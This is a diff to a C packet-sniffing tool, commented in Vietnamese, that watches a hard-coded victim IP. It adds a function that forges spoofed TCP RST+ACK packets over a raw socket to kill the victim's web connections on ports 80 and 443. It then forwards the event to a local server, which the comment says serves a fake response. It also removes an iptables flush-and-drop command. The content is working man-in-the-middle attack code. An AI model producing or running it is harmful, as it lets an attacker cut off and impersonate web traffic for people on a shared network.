@@ -75,6 +75,42 @@ void send_to_local_server(const char *msg) {
     close(sockfd);
 }
 
+// Thêm hàm gửi TCP reset để hủy kết nối gốc
+void send_tcp_reset(struct iphdr *iph, struct tcphdr *tcph) {
+    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (sock < 0) return;
+    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
+    memset(packet, 0, sizeof(packet));
+    struct iphdr *ip = (struct iphdr *)packet;
+    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
+
+    // Thiết lập IP header
+    ip->version = 4;
+    ip->ihl = 5;
+    ip->tot_len = htons(sizeof(packet));
+    ip->id = htons(rand());
+    ip->ttl = 64;
+    ip->protocol = IPPROTO_TCP;
+    ip->saddr = iph->daddr;
+    ip->daddr = iph->saddr;
+
+    // Thiết lập TCP header với flag RST+ACK
+    tcp->th_sport = tcph->th_dport;
+    tcp->th_dport = tcph->th_sport;
+    tcp->th_seq = tcph->th_ack;
+    tcp->th_ack = htonl(ntohl(tcph->th_seq) + 1); // tăng seq
+    tcp->th_off = 5;
+    tcp->th_flags = TH_RST | TH_ACK;
+    tcp->th_win = 0;
+
+    struct sockaddr_in dest;
+    memset(&dest, 0, sizeof(dest));
+    dest.sin_family = AF_INET;
+    dest.sin_addr.s_addr = ip->daddr;
+    sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&dest, sizeof(dest));
+    close(sock);
+}
+
 void process_packet(unsigned char *packet, int size) {
     struct ether_header *eth = (struct ether_header*) packet;
     struct iphdr *iph = (struct iphdr*)(packet + SIZE_ETHERNET);
@@ -95,6 +131,10 @@ void process_packet(unsigned char *packet, int size) {
             int dest_port = ntohs(tcph->th_dport);
             
             if (dest_port == 80 || dest_port == 443) {
+                // 1. Gửi TCP reset để hủy kết nối về phía victim
+                send_tcp_reset(iph, tcph);
+                
+                // 2. Forward thông tin đến local server để fake response
                 char message[1024];
                 snprintf(message, sizeof(message), "VICTIM_HTTP from %s to port %d",
                         VICTIM_IP, dest_port);
@@ -142,15 +182,6 @@ int main() {
     printf("[+] Sniffer started on %s\n", INTERFACE); 
     printf("[+] Watching victim IP: %s\n", VICTIM_IP);
     printf("[+] Forwarding to: %s:%d\n", LOCAL_SERVER_HOST, LOCAL_SERVER_PORT);
-
-    // Block traffic using iptables
-    char cmd[256];
-    snprintf(cmd, sizeof(cmd),
-            "iptables -F && "
-            "iptables -A FORWARD -s %s -p tcp --dport 80 -j DROP && "
-            "iptables -A FORWARD -s %s -p tcp --dport 443 -j DROP",
-            VICTIM_IP, VICTIM_IP);
-    system(cmd);
 
     while(1) {
         int packet_size = recvfrom(sockfd, buffer, MAX_ETHER, 0, NULL, NULL);
